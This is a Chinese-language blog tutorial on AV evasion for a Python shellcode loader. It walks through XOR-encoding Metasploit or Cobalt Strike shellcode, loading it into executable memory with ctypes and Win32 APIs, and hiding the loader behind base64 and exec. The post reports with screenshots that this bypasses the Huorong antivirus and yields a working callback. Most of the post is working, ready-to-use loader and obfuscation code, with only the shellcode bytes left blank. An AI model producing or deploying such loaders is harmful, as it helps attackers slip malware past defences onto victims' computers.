## AUTHOR:ILU

## 什么是shellcode

shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。
可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。（摘自百度）

## shellcode调用流程

在看很多大佬免杀的文章中我们都有出现过这种情景, 只能看懂shellcode存放的位置, 但是代码中具体的调用逻辑是不清楚的,
甚至连函数都看不懂。懵懵懂懂的只能够套个shellcode，只要shellcode套进去不免杀了就不清楚该往哪里下手。

那在这里为了让大家尽量能够听懂， 我们先来了解一下shellcode调用的流程。

`ps: 也许我讲的并不准确， 只是我对shellcode调用的理解。`

    
    
    1. 准备shellcode（可以是msf的shellcode， 也可以是CS的shellcode， 或者其他）
    2. 申请一段虚拟内存（作为shellcode存储的容器）
    3. 把shellcode注入到申请的虚拟内存中
    4. 利用线程（可以有很多方法）的方式调用虚拟内存中的shellcode并执行
    

## Win32 Api介绍

在windows中， 如果想要调用shellcode， 那肯定逃不过win32 api的调用， 如果会汇编的话那就另说了。

那在这里介绍一下常用的API。函数需要查询MSDN去了解， 需要有点win32编程基础。我表示我学的也很头疼， 但是基础还是不难的。

    
    
    # virtualalloc： 申请虚拟内存
    LPVOID VirtualAlloc(
    LPVOID lpAddress,        // 指定要分配的区域的期望起始地址。一般为null
    SIZE_T dwSize,           // 要分配的堆栈大小
    DWORD flAllocationType,  // 类型的分配
    DWORD flProtect          // 内存的执行权限
    );
    // 属性解释
    flAllocationType： 
    MEM_COMMIT： 在内存或磁盘上的分页文件中为指定的内存页区域分配物理存储。该函数将内存初始化为零。(提交到物理内存)
    MEM_REVERSE: 保留一定范围的进程虚拟地址空间，而不在内存或磁盘上的分页文件中分配任何实际物理存储。（保留虚拟内存）
    
    flProtect：
    PAGE_EXECUTE_READWRITE： 内存页分配为可读可写可执行
    PAGE_READWRITE： 内存页分配为可读可写
    
    #RtlMoveMemory: 将一个缓冲区的内容复制到另一个缓冲区。
    VOID RtlMoveMemory(
    IN VOID UNALIGNED  *Destination,   // 要复制到的目标
    IN CONST VOID UNALIGNED  *Source,  // 要转移的内存块
    IN SIZE_T  Length                  // 内存块大小
    );
    
    # CreateThread: 创建线程
    HANDLE CreateThread(
    LPSECURITY_ATTRIBUTES lpThreadAttributes, // 安全属性，一般设置为0或者null 
    SIZE_T dwStackSize,                       // 初始栈大小， 设置为0
    LPTHREAD_START_ROUTINE lpStartAddress,    // 线程函数地址
    LPVOID lpParameter,                       // 线程参数，没传参即为0
    DWORD dwCreationFlags,                    // 创建线程标志，对线程做控制的
    LPDWORD lpThreadId                        // 线程id
    );
    
    # WaitForSingleObject: 等待线程执行完毕
    DWORD WaitForSingleObject(
    HANDLE hHandle,        // 句柄
    DWORD dwMilliseconds   // 等待标志， 常用INFINITE， 即为无限等待线程执行完毕
    );
    

## py怎么执行win32 api

python是没有办法直接调用win32 api的，
我们需要用到一个c拓展模块，`ctypes`。并且我们会用到一个非常重要的`dll`文件--`kernel32.dll`, 为什么呢，
因为这个dll文件包含了win32 api的函数， 我们可以通过ctypes调用kernel32.dll文件实现shellcode的调用。

ctypes具体用法需要自行看官方手册啦， 不做过多讲解了，我尽量在代码中解释清楚每行的作用。

## 正题

那在这个环节， 我们要开始调用shellcode了。

##### 异或shellcode代码:

    
    
    def enc(string, key):
    result = b""
    for i in range(len(string)):
        result += chr(ord(string[i]) ^ key).encode()
    return result
    
    if __name__ == '__main__':
    string = ""
    key = 50
    result = enc(string, key)
    with open("shellcode.bin", 'wb') as f:
        f.write(result)
    

##### shellcode加载代码

    
    
    import ctypes
    
    # 调用shellcode
    def callSC(SC, key):
    # 还原异或
    buf = [ord(SC[i]) ^ key for i in range(len(SC))]
    # 转为可变的字节数组
    shellcode = bytearray(buf)
    # 计算shellcode长度
    size = len(shellcode)
    # 调用kernel32.dll
    kernel32 = ctypes.windll.kernel32
    # 修改函数返回数据类型
    kernel32.VirtualAlloc.restype = ctypes.c_uint64
    # MEM_COMMIT在c的设定中值为: 0x00001000
    MEM_COMMIT = 0x00001000
    # PAGE_EXECUTE_READWRITE在c的设定中值为: 0x40
    PAGE_EXECUTE_READWRITE = 0x40
    # 申请内存空间
    ptr = kernel32.VirtualAlloc(
        ctypes.c_int(0), # 基址可以填0, 但是数据类型需要转换
        ctypes.c_int(size), # 设置堆栈大小
        ctypes.c_int(MEM_COMMIT), # 提交到物理内存
        ctypes.c_int(PAGE_EXECUTE_READWRITE) # 设置权限为可读可写可执行
    )
    # 把shellcode放入缓冲区
    buf = (ctypes.c_char * size).from_buffer(shellcode)
    kernel32.RtlMoveMemory(
        ctypes.c_uint64(ptr), # 申请的内存
        buf,  # shellcode
        ctypes.c_int(size)  # 移动的数据大小
    )
    # 创建线程调用shellcode
    hThread = kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_uint64(ptr), # 利用线程函数调用shellcode
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0)) # 线程id为指针类型, 需要传入地址, 所以用ctypes.pointer
    )
    # 等待线程执行完毕, 关闭程序
    # INIFITE在c的设定中值为: -1
    kernel32.WaitForSingleObject(ctypes.c_int(hThread), ctypes.c_int(-1))
    
    if __name__ == '__main__':
    key = 50
    with open("shellcode.bin", 'rb') as f:
        sc = f.read().decode()
    callSC(sc, key)
    

##### 本地免杀效果

直接对py文件做免杀, 某绒不报毒

![](https://image.3001.net/images/20220123/1642873069_61ec40edc9b180153f7a9.png!small)

测试py执行上线效果

![](https://image.3001.net/images/20220123/1642873070_61ec40ee6fca7177e8654.png!small)

生成exe看下免杀效果

![](https://image.3001.net/images/20220123/1642873071_61ec40ef03bd0df945e7a.png!small)

编译火绒报毒了, 问题不大, 我们再对关键调用函数做一下处理。我这里比较直接， 直接把整个函数base64加密了。这里说一下eval和exec的区别，
eval只能执行单个语句比如：eval("os.system('calc')");exec可以执行多个语句比如：exec("import
os;os.system('calc')")。

    
    
    import ctypes
    import base64
    
    
    exec(base64.b64decode(b'').decode())
    
    
    if __name__ == '__main__':
    key = 50
    with open("shellcode.bin", 'rb') as f:
        sc = f.read().decode()
    callSC(sc, key)
    

![](https://image.3001.net/images/20220123/1642873071_61ec40efa87f41f707dc2.png!small)

可以看到整个火绒编译过程也不报毒了， 那么执行测试上线情况。

![](https://image.3001.net/images/20220123/1642873072_61ec40f0c91cd802ea00d.png!small)

正常上线， 那么简单的异或加b64编码就过免杀火绒了。

如果觉得不错的话, 可以来我的知识星球逛逛(ILU的秃头路线)

